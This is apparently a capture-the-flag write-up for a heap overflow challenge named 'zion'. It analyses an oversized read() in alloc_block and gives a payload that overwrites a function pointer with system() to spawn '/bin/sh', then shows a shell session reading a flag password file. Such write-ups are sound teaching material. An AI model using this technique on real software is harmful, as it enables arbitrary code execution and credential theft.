This challenge relies on heap chunk allocation behavior and reuse in glibc `malloc`.

### Vulnerability Analysis

Decompiling the binary reveals the `alloc_block` function, which performs two allocations per call:

1. `32 bytes`: `struct Block` (stored in the global `blocks[]` array)
2. `64 bytes`: Temporary user data buffer (`char *buf`)

```c
// Initialize block fields
block->id = block_count;
block->size = size;
block->on_free = default_on_free;
strncpy(block->name, name, 15);

```

After allocation, `alloc_block` reads into `buf` using an oversized count (`size + 0x40`), causing a heap buffer overflow:

```c
// 6. Read data into the buffer
// Passes (size + 0x40) as the count parameter to read()
read(STDIN_FILENO, buf, size + 0x40);

```

Later, `free_block` executes the function pointer stored inside the `Block` structure:

```c
// zion.c#L123-L134
printf("[ZION] Freeing block %u\n", index);

on_free_fn cleanup = blocks[index]->on_free;

if (cleanup != NULL) {
    cleanup(blocks[index]);
}

```

Because `cleanup(blocks[index])` passes the pointer to the `Block` struct as the first argument (`RDI`), hijacking `on_free` to point to `system()` will cause `system(block)` to be executed.

### Heap Layout & Chunk Reuse

Looking at `main`:

```c
int main(void) {
    uid_t euid = geteuid();
    setreuid(euid, euid);

    print_banner();

    // Allocate default blocks
    alloc_block(0x40, "ALPHA");
    alloc_block(0x40, "BETA");

    // Display current allocations
    list_blocks();

    // Cleanup blocks
    free_block(0);
    free_block(1);

    return 0;
}

```

1. During the first `alloc_block(0x40, "ALPHA")` call, `malloc` allocates `BLOCK-1` (32 bytes) followed by `USER-BUFFER-1` (64 bytes). `USER-BUFFER-1` is freed at the end of the function.
2. During the second `alloc_block(0x40, "BETA")` call, `malloc` allocates `BLOCK-2` (32 bytes) by taking memory from the top chunk (or available bins), and reallocates the 64-byte `USER-BUFFER-2`.
3. Because the user buffer chunk is adjacent to `BLOCK-2`, overflowing `USER-BUFFER-1` / `USER-BUFFER-2` allows writing into `BLOCK-2`:

```text
[BLOCK-1: 32 bytes]
[Chunk Header: 16 bytes]
[USER-BUFFER: 64 bytes]
[Chunk Header: 16 bytes]
[BLOCK-2: 32 bytes] -> { id, size, on_free, name }

```

### Exploit Strategy

We craft our input to preserve valid heap chunk metadata and overwrite `BLOCK-2`:

* Place `"/bin/sh\x00"` at the start of `BLOCK-2` (so that `RDI` points to `"/bin/sh"` when `on_free` is called).
* Pad to the `on_free` function pointer offset.
* Overwrite `on_free` with the address of `system()`.

When `free_block(1)` executes:

```c
blocks[1]->on_free(blocks[1]); // becomes system("/bin/sh")

```

```python
payload = b"/bin/sh\x00" + b'X' * 16 + ROP_SYSTEM

```

**Execution & Flag Capture:**

```sh
bonus01@rainfall:~$ echo "" > exploit.py && vim exploit.py && python3 exploit.py
[+] Starting local process '/home/bonus01/zion': pid 978
[*] Switching to interactive mode
 [ZION] Block 0: label=ALPHA size=64
[ZION] Block 1852400175: label=XXXXXXXXXXXXXXXXP\x87\xc5\xf7\xff\x7f size=6845231
[ZION] Freeing block 0
[ZION] Freeing block 1
$ ls
exploit.py  zion
$ whoami
flagbonus01
$ cat /home/flagbonus01/.pass
8g8nnrrtsasgf9i7etv0s9a21j5f9riw

```